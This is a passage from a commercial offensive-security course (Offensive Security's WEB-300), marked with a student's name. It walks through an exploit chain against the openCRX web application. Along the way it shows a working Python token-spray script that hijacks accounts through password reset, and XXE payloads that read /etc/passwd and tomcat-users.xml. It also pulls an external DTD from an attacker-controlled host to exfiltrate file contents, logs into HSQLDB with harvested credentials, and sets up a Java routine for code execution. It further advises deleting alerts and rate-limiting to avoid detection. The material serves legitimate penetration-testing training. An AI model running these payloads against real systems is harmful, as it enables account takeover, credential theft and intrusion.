73   *  - para_0, para_1, ... para_n: additional parameters to be passed to the wizard 
(optional) 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
317 
74   *  Example: 
75   *  http://localhost:8080/opencrx-core-
CRX/WizardInvoker.jsp?wizard=/wizards/en_US/UploadMedia.jsp&provider=CRX&segment=Stand
ard&xri=xri://@openmdx*org.opencrx.kernel.home1/provider/CRX/segment/Standard&user=wfr
o&password=. 
Listing 334 - An example of provider and segment in WizardInvoker.jsp 
On lines 68 and 69, we find references to providers and segments. We can also find an example 
URL on line 75 that uses “CRX” as the provider and “Standard” as the segment. This matches the 
same pattern we found in RequestPasswordReset.jsp. We will try using “CRX” as the 
providerName and “Standard” as the segmentName in our attack. 
Now that we know what all of the values are, let’s examine the source code of 
PasswordResetConfirm.jsp to determine what data we need to send to the server for the reset. 
067  String resetToken = request.getParameter("t"); 
068  String providerName = request.getParameter("p"); 
069  String segmentName = request.getParameter("s"); 
070  String id = request.getParameter("id"); 
071  String password1 = request.getParameter("password1"); 
072  String password2 = request.getParameter("password2"); 
... 
163  <form role="form" class="form-signin" style="max-width:400px;margin:0 auto;" 
method="POST" action="PasswordResetConfirm.jsp" accept-charset="UTF-8"> 
164      <h2 class="form-signin-heading">Reset password for <%= id %>@<%= providerName 
+ "/" + segmentName %></h2>                   
165      <input type="hidden" name="t" value="<%= resetToken %>" /> 
166      <input type="hidden" name="p" value="<%= providerName %>" /> 
167      <input type="hidden" name="s" value="<%= segmentName %>" /> 
168      <input type="hidden" name="id" value="<%= id %>" /> 
169      <input type="password" name="password1" autofocus="" placeholder="Password" 
class="form-control" /> 
170      <input type="password" name="password2" placeholder="Password (verify)" 
class="form-control" /> 
171      <br /> 
172      <button type="submit" class="btn btn-lg btn-primary btn-block">OK</button> 
173      <br /> 
174      <%@ include file="password-reset-confirm-note.html" %>                  
175  </form> 
Listing 335 - Code excerpt from PasswordResetConfirm.jsp 
Lines 163 - 175 are the form element we want to mimic in our reset script. In addition to the 
token, providerName, segmentName, and id, we need to provide a new password value in the 
password1 and password2 fields. 
We now have everything we need to write a Python script to automate the password reset 
process. We will iterate through the list of tokens we previously generated with our 
OpenCRXToken Java class and POST each token to the server. Let’s inspect the server responses 
to see if the reset worked and exit the for loop once we have a successful reset. 
#!/usr/bin/python3 
 
import requests 
import argparse 
 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
318 
parser = argparse.ArgumentParser() 
parser.add_argument('-u','--user', help='Username to target', required=True) 
parser.add_argument('-p','--password', help='Password value to set', required=True) 
args = parser.parse_args() 
 
target = "http://opencrx:8080/opencrx-core-CRX/PasswordResetConfirm.jsp" 
 
print("Starting token spray. Standby.") 
with open("tokens.txt", "r") as f: 
    for word in f: 
        # t=resetToken&p=CRX&s=Standard&id=guest&password1=password&password2=password 
        payload = {'t':word.rstrip(), 
'p':'CRX','s':'Standard','id':args.user,'password1':args.password,'password2':args.pas
sword} 
 
        r = requests.post(url=target, data=payload) 
        res = r.text 
 
        if "Unable to reset password" not in res: 
            print("Successful reset with token: %s" % word) 
            break 
Listing 336 - OpenCRXReset.py 
Let’s run the script. It may take a few minutes to return a result. 
kali@kali:~/Documents/research$ ./OpenCRXReset.py -u guest -p password 
Starting token spray. Standby. 
Successful reset with token: yzs4pCxiRTym9Srs6OrzUY0b9HtEnDK8SrPtjBUe 
Listing 337 - Running the reset script 
We can verify the password reset was successful by attempting to log in to the site in our 
browser with the username “guest” and password “password”. 
 
Figure 249: Logged in as guest 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
319 
9.2.5.1.1 
 
We have now successfully reset the password for the guest account and have access to the 
application. A few alerts were created for the password resets we requested. Although not 
required for this exercise, deleting these alerts would help maintain stealth during a penetration 
test. 
Sending up to 3000 requests to the web application is noisy. In a real world 
scenario, we would likely want to rate limit our script to hide our tracks in normal 
traffic and avoid overloading the server. 
9.2.5.2 Exercises 
1. 
Run the script and reset the password for the guest account. 
2. 
Reset the password for the admin-Standard account. 
9.2.5.3 Extra Mile 
Automate the entire password reset attack chain, including the deletion of any password reset 
alerts that are generated. 
9.3 XML External Entity Vulnerability Discovery 
With access to the web application, let’s search for interesting functionality. We can find a link to 
the REST APIs under Wizards > Explore API…. When prompted, we’ll use the same login 
credentials as earlier. 
 
Figure 250: openCRX API Explorer 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
320 
9.3.1.1.1 
 
The API Explorer uses Swagger,156 a tool for documenting and consuming REST 
APIs. Finding Swagger documents like this can help us discover API endpoints 
and provide sample request bodies. 
The API endpoints appear to accept JSON and XML requests. If the application’s XML parser is 
insecurely configured, we might be able to exploit it with an XML External Entity (XXE)157 attack. 
9.3.2 Introduction to XML 
Before continuing, we need to review Extensible Markup Language (XML).158 XML is designed to 
encode data in a way that’s easier for humans and machines to read. The layout of an XML 
document is somewhat similar to an HTML document, although there are differences in 
implementations. 
For example, this is a simple XML document: 
1  <?xml version="1.0" encoding="UTF-8"?> 
2  <contact> 
3    <firstName>Tom</firstName> 
4    <lastName>Jones</lastName> 
5  </contact> 
Listing 338 - A sample XML document 
The example above starts with an XML declaration on line 1. Lines 2 through 5 define a contact 
element. The firstName and lastName elements are sub-elements of contact. 
9.3.3 XML Parsing 
An application that relies on data stored in the XML format will inevitably make use of an XML 
parser or processor. The application calls this component when XML data needs to be processed. 
The parser is responsible for the analysis of the markup code. Once the parser finishes 
processing the XML data, it passes the resulting information back to the application. 
Similar to any other application component that parses user input, XML processors can suffer 
from different types of vulnerabilities originating from malformed or malicious input data. 
XML parsing vulnerabilities can, at times, provide powerful primitives to an attacker. Depending 
on the programming language an XML parser is written in, these primitives can eventually be 
chained together to achieve devastating effects such as: 
• 
Information Disclosure 
• 
Server-Side Request Forgery 
• 
Denial of Service 
• 
Remote Command Injection 
 
156 (SmartBear Software, 2020), https://swagger.io/ 
157 (Wikipedia, 2020), https://en.wikipedia.org/wiki/XML_external_entity_attack 
158 (Wikipedia, 2020), https://en.wikipedia.org/wiki/XML 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
321 
• 
Remote Code Execution 
9.3.4 XML Entities 
From the attacker’s perspective, Document Type Definitions (DTDs) are an interesting feature of 
XML. DTDs can be used to declare XML entities within an XML document. In very general terms, 
an XML entity is a data structure typically containing valid XML code that will be referenced 
multiple times in a document. We might also think of it as a placeholder for some content that we 
can refer to and update in a single place and propagate throughout a given document with 
minimal effort, similar to variables in a programming language. 
Generally speaking, there are three types of XML entities: internal, external, and parameter. 
9.3.4.1 Internal Entities 
Internal entities are locally defined within the DTD. Their general format is as follows: 
<!ENTITY name "entity_value"> 
Listing 339 - The format of a internally parsed entity 
This is a very trivial example of an internal entity: 
<!ENTITY test "<entity-value>test value</entity-value>"> 
Listing 340 - Example of internal entity syntax 
Note that an entity does not have any XML closing tags and is using a special declaration 
containing an exclamation mark. For example, the internal entity in Listing 340 is using a hard-
coded string value that contains valid XML code. 
9.3.4.2 External Entities 
By definition, external entities are used when referencing data that is not defined locally. As such, 
a critical component of the external entity definition is the URI from which the external data will be 
retrieved. 
External entities can be split into two groups, namely private and public. The syntax for a private 
external entity is: 
<!ENTITY name SYSTEM "URI"> 
Listing 341 - The format of a privately parsed external entity 
This is an example of a private external entity: 
<!ENTITY offsecinfo SYSTEM "http://www.offsec.com/company.xml"> 
Listing 342 - Example of private external entity syntax 
Most importantly, the SYSTEM keyword indicates that a private external entity for use by a single 
user or perhaps a group of users. In other words, this type of entity is not intended for wide-
spread use. 
In contrast, public external entities are intended for a much wider audience. The syntax for a 
public external entity is: 
<!ENTITY name PUBLIC "public_id" "URI"> 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
322 
Listing 343 - The format of a publicly parsed external entity 
This is an example of a public external entity: 
<!ENTITY offsecinfo PUBLIC "-//W3C//TEXT companyinfo//EN" 
"http://www.offsec.com/companyinfo.xml"> 
Listing 344 - Example of public external entity syntax 
The PUBLIC keyword indicates that this is a public external entity. 
Additionally, public external entities may specify a public_id. This value is used by XML pre-
processors to generate alternate URIs for the externally parsed entity. 
9.3.4.3 Parameter Entities 
Parameter entities exist solely within a DTD, but are otherwise very similar to any other entity. 
Their definition syntax differs only by the inclusion of the % prefix: 
<!ENTITY % name SYSTEM "URI"> 
Listing 345 - The format of a parameter entity 
<!ENTITY % course 'AWAE'> 
<!ENTITY Title 'Offensive Security presents %course;' > 
Listing 346 - An example of a parameter entity 
9.3.4.4 Unparsed External Entities 
As we previously mentioned, an XML entity does not have to contain valid XML code. It can 
contain non-XML data as well. In those instances, we have to prevent the XML parser from 
processing the referenced data by using the NDATA declaration. The following formats can be 
used for both public and private external entities. 
<!ENTITY name SYSTEM "URI" NDATA TYPE> 
<!ENTITY name PUBLIC "public_id" "URI" NDATA TYPE> 
Listing 347 - In unparsed external entities, the data read from the URI is treated as data of type determined by the TYPE 
argument 
We can access binary content with unparsed entities. This can be important in web application 
environments that do not have the same flexibility that PHP offers in terms of I/O stream 
manipulation. 
9.3.5 Understanding XML External Entity Processing Vulnerabilities 
As discussed in the previous section, external entities can often access local or remote content 
via declared system identifiers. An XML External Entity (XXE) injection is a specific type of attack 
against XML parsers. In a typical XXE injection, the attacker forces the XML parser to process one 
or more external entities. This can result in the disclosure of confidential information not normally 
accessible by the application. That means the main prerequisite for the attack is the ability to feed 
a maliciously-crafted XML request containing system identifiers that point to sensitive data to the 
target XML processor. 
There are many techniques that allow an attacker to exfiltrate data, including binary content, 
using XXE attacks. Additionally, depending on the application’s programming language and the 
available protocol wrappers, it may be possible to leverage this attack for full command injection. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
323 
In some languages, like PHP, XXE vulnerabilities can even lead to remote code 
execution. In Java, however, we cannot execute code with just an XXE 
vulnerability. 
9.3.6 Finding the Attack Vector 
Let’s demonstrate an XXE attack with a simple example. 
When an XML parser encounters an entity reference, it replaces the reference with the entity’s 
value. 
<?xml version="1.0" ?> 
<!DOCTYPE data [ 
<!ELEMENT data ANY > 
<!ENTITY lastname "Replaced"> 
]> 
<Contact> 
  <lastName>&lastname;</lastName> 
  <firstName>Tom</firstName> 
</Contact> 
Listing 348 - An internal entity example 
When the XML above is parsed, the parser replaces the entity reference “&lastname;” with the 
entity’s value “Replaced”. If an application used the results and displayed the contact’s name, it 
would display “Tom Replaced”. This example uses an internal entity. 
What if we change the XML entity to an external entity and reference a file on the server? 
<?xml version="1.0"?> 
<!DOCTYPE data [ 
<!ELEMENT data ANY > 
<!ENTITY lastname SYSTEM "file:///etc/passwd"> 
]> 
<org.opencrx.kernel.account1.Contact> 
  <lastName>&lastname;</lastName> 
  <firstName>Tom</firstName> 
</org.opencrx.kernel.account1.Contact> 
Listing 349 - An external entity example 
A vulnerable parser will load the file contents and place them in the XML document. In the 
example of 349, a vulnerable parser would read in the contents of /etc/passwd and place that 
content in between the lastName tags. If the lastName contents are included in a server response 
or we can retrieve the data in another way after the XML has been parsed, we can use this 
vulnerability to read files on the server. This is a fundamental XXE attack technique. 
If the application is vulnerable to XXE, we want to make sure we can observe the results of the 
XXE attack. Ideally, we would inject the XXE payload into a field that is displayed in the web 
application. 
After spending some time familiarizing ourselves with the application, the Accounts page seems 
like a good fit because the Accounts API accepts XML input. Each account or contact also has 
multiple text fields that are displayed in the web application. If we can successfully create 
accounts using XXE payloads in one of these fields, such as a name field, we should be able to 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
324 
view the results of our XXE attack in the web application. Let’s attempt this attack against the 
Accounts API. 
To find the page for the Accounts API, we can switch back to the main web application and click 
on Manage Accounts. If the link doesn’t show up, we’ll find it by clicking on the hamburger menu 
first. 
 
Figure 251: Manage Accounts 
Next, let’s click on Wizards > Explore API… 
 
Figure 252: Explore API 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
325 
9.3.6.1.1 
 
On the API Explorer page for the Accounts API, we can use a POST to /account as the basis of our 
attack. Let’s change “Request body” to “application/xml” to send XML data instead of JSON. 
Next, we need a sample of the data that goes in the POST body. There is no example value, but 
we can inspect some sample objects by clicking on Model. 
 
Figure 253: Viewing Sample Models 
Scrolling through the entire model, we observe several fields. This API call appears to be 
complicated because the Swagger documentation displays all possible fields. We want 
something simple with the minimum number of fields. The more fields we have to submit, the 
more potential issues we could run into with data types, formatting, and server-side validation. We 
can search the openCRX site for documentation159 to find a simple example for this API endpoint: 
Method: POST 
URL: http://localhost:8080/opencrx-rest-
CRX/org.opencrx.kernel.account1/provider/CRX/segment/Standard/account 
Body:    
<?xml version="1.0"?> 
<org.opencrx.kernel.account1.Contact> 
  <lastName>REST</lastName> 
  <firstName>Test #1</firstName> 
</org.opencrx.kernel.account1.Contact> 
Listing 350 - Sample object creation from http://www.opencrx.org/opencrx/2.3/new.htm 
Let’s use this example to test out the API. We can click Try it out and paste the sample body into 
the “In” field. 
 
159 (openCRX, 2020), http://www.opencrx.org/opencrx/2.3/new.htm 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
326 
 
Figure 254: Sample POST body 
Next, we’ll click Execute to send the request. We should receive a successful response in the web 
UI. Let’s switch to Burp Suite and send the POST request to Repeater. We can add a simple 
DOCTYPE and ENTITY to determine if they are parsed by the server. 
We will modify the POST like this: 
<?xml version="1.0"?> 
<!DOCTYPE data [ 
<!ELEMENT data ANY > 
<!ENTITY lastname "Replaced"> 
]> 
<org.opencrx.kernel.account1.Contact> 
  <lastName>&lastname;</lastName> 
  <firstName>Tom</firstName> 
</org.opencrx.kernel.account1.Contact> 
Listing 351 - lastname entity 
After we make the changes, we can click Send and search the response for the “lastname” field’s 
value to determine if the entity was parsed. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
327 
 
Figure 255: Testing doctype and entity parsing 
Excellent! The application’s XML parser read our entity and put “Replaced” as the last name. Now 
that we know internal entities are being parsed, let’s try using an external entity to reference a file 
on the underlying server and find out if we can retrieve the contents. 
We need to update our POST body as follows: 
<?xml version="1.0"?> 
<!DOCTYPE data [ 
<!ELEMENT data ANY > 
<!ENTITY lastname SYSTEM "file:///etc/passwd"> 
]> 
<org.opencrx.kernel.account1.Contact> 
  <lastName>&lastname;</lastName> 
  <firstName>Tom</firstName> 
</org.opencrx.kernel.account1.Contact> 
Listing 352 - Using XXE to read /etc/passwd 
When we send it, we receive an error. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
328 
 
Figure 256: Attempting to read /etc/passwd 
The response is quite long so let’s examine it closely for useful information. As we scroll through 
the response, we discover an SQL statement about a quarter of the way down. 
{"@id":"statement","$":"INSERT INTO OOCKE1_ACCOUNT (citizenship_, modified_at, 
ext_code21_, children_names_, education, access_level_browse, external_link_, 
ext_code20_, account_category_, created_at, modified_by_, account_type_, 
access_level_update, religion_, ext_code27_, user_date_time4_, dtype, ext_code29_, 
first_name, user_date4_, ext_code22_, vcard, family_status, \"P$$PARENT\", 
user_boolean4_, category_, gender, owner_, business_type_, ext_code28_, account_state, 
access_level_delete, created_by_, last_name, user_string4_, account_rating, 
preferred_contact_method, partner_, closing_code, contact_, salutation_code, 
user_number4_, ext_code26_, ext_code25_, ext_code23_, full_name, user_code4_, 
preferred_written_language, ext_code24_, preferred_spoken_language, object_id) VALUES 
(?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 
?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 
?)"},{"@id":"values","$":"[0, Tue Feb 18 08:40:12 PST 2020, 0, 0, 0, 3, 1, 0, 0, Tue 
Feb 18 08:40:12 PST 2020, 1, 0, 2, 0, 0, 0, org:opencrx:kernel:account1:Contact, 0, 
Tom, 0, 0, 
BEGIN:VCARD\nVERSION:3.0\nUID:3743L6W72YVHM8WC6MBNJN12H\nREV:20200218T164012Z\nN:root:
x:0:0:root:\/root:\/bin\/bash\ndaemon:x:1:1:daemon:\/usr\/sbin:\/usr\/sbin\/nologin\nb
in:x:2:2:bin:\/bin:\/usr\/sbin\/nologin\nsys:x:3:3:sys:\/dev:\/usr\/sbin\/nologin\nsyn
c:x:4:65534:sync:\/bin:\/bin\/sync\ngames:x:5:60:games:\/usr\/games:\/usr\/sbin\/nolog
in\nman:x:6:12:man:\/var\/cache\/man:\/usr\/sbin\/nologin\nlp:x:7:7:lp:\/var\/spool\/l
pd:\/usr\/sbin\/nologin\nmail:x:8:8:mail:\/var\/mail:\/usr\/sbin\/nologin\nnews:x:9:9:
news:\/var\/spool\/news:\/usr\/sbin\/nologin\nuucp:x:10:10:uucp:\/var\/spool\/uucp:\/u
sr\/sbin\/nologin\nproxy:x:13:13:proxy:\/bin:\/usr\/sbin\/nologin\nwww-
data:x:33:33:www-data:\/var\/www:\/usr\/sbin\/nologin\n 
... 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
329 
Listing 353 - Error message excerpt one 
It appears the XML parser was able to read the contents of /etc/passwd and the application 
attempted to insert it into the database in at least one field. 
Let’s keep scrolling through the error message. Near the end, we find a more specific exception 
and description. 
"@exceptionClass":"java.sql.SQLDataException","@methodName":"sqlException","descriptio
n":"data exception: string data, right truncation;  table: OOCKE1_ACCOUNT column: 
FULL_NAME","parameter":{"_item":[{"@id":"sqlErrorCode","$":"3401"},{"@id":"sqlState","
$":"22001"}]}, 
Listing 354 - Error message excerpt two 
A java.sql.SQLDataException160 usually indicates a data error occurred when an SQL statement 
was executed. We can use the “description” field to learn more about what kind of error we 
caused. A quick Google search for “string data, right truncation” reveals the likely cause of this 
error was attempting to insert data larger than a column’s length. 
Our exploit caused the XML parser to read the contents of /etc/password as illustrated by the SQL 
statement in 353. The contents of the file, however, were too large for the column size. Even 
though we failed to create a new contact, we can still examine the contents of the file we 
specified through the error message. 
9.3.6.2 Exercises 
1. 
Recreate the XXE attack described above. 
2. 
Is there a way to use the XXE to view the contents of a directory? 
3. 
Use the XXE vulnerability to enumerate the server’s file system. 
9.3.6.3 Extra Mile 
Create a script to parse the results of the XXE attack and cleanly display the file contents. 
9.3.7 CDATA 
We can use the XXE vulnerability to read simple files. However, we may encounter parser errors if 
we attempt to read files containing XML or key characters used in XML as delimiters, such as “<” 
and “>”. We need to make sure that our XML content remains properly formatted after the file 
contents are inserted. Much like HTML, XML supports character escaping. We can’t use this with 
external entities, however, since we aren’t able to manipulate the content of the files we are 
attempting to include. 
XML also supports CDATA161 sections in which internal contents are not treated as markup. A 
CDATA section starts with “<![CDATA[" and ends with "]]>”. Anything between the tags is treated as 
text. If we can wrap file contents in CDATA tags, the parser will not treat it as markup, resulting in 
a properly-formatted XML file. 
 
160 (Oracle, 2020), https://docs.oracle.com/javase/8/docs/api/java/sql/SQLDataException.html 
161 (Wikipedia, 2020), https://en.wikipedia.org/wiki/CDATA 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
330 
9.3.8 Updating the XXE Exploit 
Let’s create two new entities that will act as the opening and closing CDATA tags. We will receive 
an XML parser error if we try to concatenate three entities together, so we’ll need an additional 
entity to act as a “wrapper” for the CDATA entities and the file content entity. However, we can’t 
reference a single entity from another within the DTD in which they are defined. We will need to 
use parameter entities referenced by the “wrapper” entity in an external DTD file. An external DTD 
file can be a simple XML file containing only entity definitions. 
Let’s create a DTD file with the following content in the webroot (/var/www/html) of our Kali 
machine: 
kali@kali:/opencrx$ sudo cat /var/www/html/wrapper.dtd  
<!ENTITY wrapper "%start;%file;%end;"> 
Listing 355 - wrapper.dtd 
Once wrapper.dtd is in our webroot, we’ll need to start our Apache2 service so the openCRX 
server can retrieve the file. 
kali@kali:~/opencrx$ sudo systemctl start apache2 
Listing 356 - Starting the apache2 service 
Now we can update our payload to reference this DTD file on our Kali instance. Since the 
application is running on TomEE, let’s see if we can can get TomEE user credentials by targeting 
the tomcat-users.xml file. 
<?xml version="1.0"?> 
<!DOCTYPE data [ 
<!ENTITY % start "<![CDATA["> 
<!ENTITY % file SYSTEM "file:///home/student/crx/apache-tomee-plus-7.0.5/conf/tomcat-
users.xml" > 
<!ENTITY % end "]]>"> 
<!ENTITY % dtd SYSTEM "http://192.168.119.120/wrapper.dtd" > 
%dtd; 
]> 
<org.opencrx.kernel.account1.Contact> 
  <lastName>&wrapper;</lastName> 
  <firstName>Tom</firstName> 
</org.opencrx.kernel.account1.Contact> 
Listing 357 - Updated XXE payload 
If everything works, the application’s XML parser will download and parse wrapper.dtd. The 
wrapper entity defined in the DTD will be created, %start will be replaced with “<![CDATA[", %file 
will be replaced with the contents of tomcat-users.xml, and %end will be replaced with "]]>”. The 
resulting value is placed in the lastName field. However, if the file contents are too large for that 
field, we should still be able to inspect the contents in the error message from the server. 
Let’s update our request in Repeater and click Send to submit it to the server. We’ll receive an 
error response from the server containing the contents of the tomcat-users.xml file. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
331 
 
Figure 257: Using XXE to read tomcat-users.xml 
Excellent. Using the CDATA wrapper, we should be able to read any file on the server accessible 
by the application process. 
9.3.8.1 Exercise 
Implement the “wrapper” payload and use it to read an XML file. 
9.3.9 Gaining Remote Access to HSQLDB 
Now we understand how to use the XXE vulnerability to read the tomcat-users.xml file and 
retrieve the credentials within. 
Our first instinct might be to go after the Tomcat Manager application and try to deploy a 
malicious WAR file. However, if we attempt to browse to the Tomcat Manager application on the 
openCRX server, we find that the default configuration restricts access to localhost. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
332 
 
Figure 258: Access Denied 
We might also attempt to use the XXE to access Tomcat Manager with a Server-Side Request 
Forgery (SSRF)162 attack, but this also proves problematic. While there are users with the “tomcat” 
and “manager” roles, these are not the correct roles for the version of Tomcat on the server.163 
Unable to leverage the XXE vulnerability to access Tomcat Manager, we’ll need another attack 
vector. 
Interestingly, the File class in Java can reference files and directories.164 If we modify our XXE 
payload to reference directories instead of files, it should return directory listings. We can use this 
to enumerate directories and files on the server. 
 
162 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Server-side_request_forgery 
163 (Apache Software Foundation, 2018), https://tomcat.apache.org/tomcat-8.0-doc/manager-
howto.html#Configuring_Manager_Application_Access 
164 (Oracle, 2020), https://docs.oracle.com/javase/8/docs/api/java/io/File.html 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
333 
 
Figure 259: Using XXE to get directory listings 
We want to use this vulnerability to find files that can provide us with additional access or 
credentials. We can often find this information in config files, batch files, and shell scripts. After a 
search, we find several files related to the database at /home/student/crx/data/hsqldb/, including 
a file with credentials, dbmanager.sh. 
 
Figure 260: Reading dbmanager.sh 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
334 
9.3.9.1.1 
 
A JDBC connection string in the file with a value of “jdbc:hsqldb:hsql://127.0.0.1:9001/CRX” lists a 
username of “sa” and a password of “manager99”. The application appears to be using 
HSQLDB,165 a Java database. Let’s familiarize ourselves with HQSLDB. 
HSQLDB servers rely on Access Control Lists (ACLs) or network layer protections166 to restrict 
access beyond usernames and passwords. We can read the crx.properties file to determine if any 
ACLs are defined within HSQLDB itself. 
 
Figure 261: Reading crx.properties 
There are no ACLs defined in the properties file. Without remote code execution on the server, we 
have no way of knowing if iptables rules are in place to prevent access to the database. Since the 
JDBC string referenced port 9001, let’s do a quick nmap scan to find out if TCP port 9001 is open. 
kali@kali:~/opencrx$ nmap -p 9001 opencrx 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-17 10:37 CST 
Nmap scan report for opencrx(192.168.121.126) 
Host is up (0.00047s latency). 
 
PORT     STATE SERVICE 
9001/tcp open  tor-orport 
 
165 (The HSQL Development Group, 2020), http://hsqldb.org/ 
166 (The HSQL Development Group, 2020), http://www.hsqldb.org/doc/2.0/guide/running-chapt.html#rgc_security 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
335 
 
Nmap done: 1 IP address (1 host up) scanned in 0.05 seconds 
Listing 358 - Using nmap to verify the HSQLDB port is open 
The database port appears to be open and we have credentials, so let’s try connecting to the 
database and determine what we can do with it. We will need an HSQLDB client in order to 
connect. We can download hsqldb.jar from the HSQLDB website,167 which includes a database 
manager tool.168 
Once we have a copy of the jarfile on our Kali machine, we will use java to run it, use -cp to add 
the 
jar 
to 
our 
classpath, 
specify 
we 
want 
the 
GUI 
with 
org.hsqldb.util.DatabaseManagerSwing, connect to the remote database with --url, and 
set the credentials with --user and --password: 
kali@kali:~/Documents/jarfiles$ java -cp hsqldb.jar 
org.hsqldb.util.DatabaseManagerSwing --url jdbc:hsqldb:hsql://opencrx:9001/CRX --user 
sa --password manager99 
Listing 359 - Connecting to HSQLDB instance 
After a few moments, a new GUI window should open. 
 
Figure 262: HSQL Database Manager 
 
167 (Slashdot Media, 2020), https://sourceforge.net/projects/hsqldb/files/hsqldb/ 
168 (The HSQL Development Group, 2020), http://hsqldb.org/doc/2.0/util-guide/dbm-chapt.html 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
336 
9.3.9.1.2 
 
We could query the database but perhaps we can find a way to do more, like write a file. HSQL 
does not have a function similar to MySQL’s “SELECT INTO OUTFILE”. However, the 
documentation reveals that HSQL custom procedures can call Java code.169 
9.3.9.2 Exercise 
Connect to the HSQLDB service. 
9.3.10 Java Language Routines 
We can call static methods of a Java class from HSQLDB using Java Language Routines 
(JRT).170 Like any Java program, the class needs to be in the application’s classpath.171 
We can only use certain variable types as parameters and return types. These types are mostly 
primitives and a few simple objects that map between Java types and SQL types. 
Java is an object-oriented programming language. It does, however, have eight 
data types that are not objects, such as int or float. Primitives can be declared 
and assigned values without instantiating them as objects with the new keyword. 
This can be confusing because there are also object versions for each primitive, 
such as Integer or Float. 
JRTs can be defined as functions or procedures. Functions can be used as part of a normal SQL 
statement if the Java method returns a variable. If the Java method we want to call returns void, 
we need to use a procedure. Procedures are invoked with a CALL statement. 
The syntax to create functions and procedures is fairly similar, as we will observe later. 
9.4 Remote Code Execution 
Let’s create a proof-of-concept function that enables us to check system properties172 by calling 
the Java System.getProperty() method. Java uses these system properties to track configuration 
about its runtime environment, such as the Java version and the current working directory. The 
method call is relatively simple - it takes in a String value and returns a String value. We want 
something simple to verify we can create and run a function on the remote server, and we may 
find it useful later on to be able to view system properties. 
 CREATE FUNCTION systemprop(IN key VARCHAR) RETURNS VARCHAR  
  LANGUAGE JAVA  
  DETERMINISTIC NO SQL 
  EXTERNAL NAME 'CLASSPATH:java.lang.System.getProperty' 
Listing 360 - Defining a JRT function to call System.getProperty 
 
169 (The HSQL Development Group, 2020), http://hsqldb.org/doc/2.0/guide/sqlroutines-chapt.html#src_jrt_routines 
170 (The HSQL Development Group, 2020), http://hsqldb.org/doc/guide/sqlroutines-chapt.html#src_jrt_routines 
171 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Classpath_(Java) 
172 (Oracle, 2019), https://docs.oracle.com/javase/tutorial/essential/environment/sysprop.html 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
337 
Let’s break down the code above. On the first line, we’ll create a new function named 
“systemprop”, which takes in a “key” value as a varchar and returns a varchar. Next, we’ll tell the 
database to run the function as Java. And finally, we’ll specify that we want the function to run the 
getProperty173 method of the java.lang.System class. The Java method expects a String value 
named “key”. This must match the name of the variable passed after the IN keyword in the 
function we are defining. 
To create the function on the openCRX server, we will enter the code above in the upper right 
window of the HSQL Database Manager GUI and click Execute SQL. 
 
Figure 263: Creating an HSQL function 
Once the function is created, we need to call it. However, functions are not the same as tables 
and we cannot select from them directly in a SELECT statement unless we are including a table. 
Instead, we can call the function using a VALUES clause without specifying a SELECT from a 
table. Let’s pass in “java.class.path” as our parameter to check the classpath of the HSQLDB 
process. 
 
